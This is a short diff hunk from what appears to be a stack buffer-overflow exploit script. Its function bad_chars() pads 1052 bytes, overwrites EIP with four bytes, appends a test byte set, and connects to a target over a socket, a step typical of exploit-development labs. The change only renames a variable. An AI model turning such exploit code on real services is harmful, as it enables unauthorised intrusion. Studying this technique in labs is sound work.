@@ -88,7 +88,7 @@ def bad_chars():
     offset = 1052
     buffer = b"A"*offset
     eip = b"B"*4
-    payload = buffer + eip + all_chars
+    payload = buffer + eip + allchars
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
